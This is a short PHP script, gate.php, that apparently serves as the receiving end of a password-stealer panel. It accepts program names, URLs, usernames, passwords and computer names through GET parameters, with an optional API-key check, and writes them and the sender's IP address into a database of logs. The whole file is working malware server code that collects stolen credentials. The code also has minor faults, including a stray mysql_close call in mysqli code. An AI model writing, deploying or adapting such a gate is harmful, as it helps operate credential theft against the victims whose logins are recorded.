<?php
// gate.php
// inputs data into the database

require_once('connect.php');
require_once('config.php');
require_once('./includes/functions.php'); // general functions

$key = isset($_GET['6'])? $_GET['6'] : ''; //api key value

if ($safemode) {
	if (!isset($key) || isset($key) && $key != $apikey) {
		die();
	} else {
		//continue
	}
}
// test
$program = htmlentities($_GET['1'], ENT_QUOTES);; // escaped on output
$url = htmlentities($_GET['2'], ENT_QUOTES);;
$user = htmlentities($_GET['3'], ENT_QUOTES);;
$pass = htmlentities($_GET['4'], ENT_QUOTES);;
$pcname = htmlentities($_GET['5'], ENT_QUOTES);
$date = date('d-m-Y H:i:s');
$ip =  $_SERVER['REMOTE_ADDR'];


$insert = "INSERT INTO logs (program, url, user, pass, pc, postdate, ip)
		VALUES (?,?,?,?,?,?,?)";
$insert = mysqli_prepare($conn, $insert);

mysqli_stmt_bind_param($insert, 'sssssss', $program, $url, $user, $pass, $pcname, $date, $ip); // s for string
mysqli_stmt_execute($insert);
mysql_close($conn);
?>
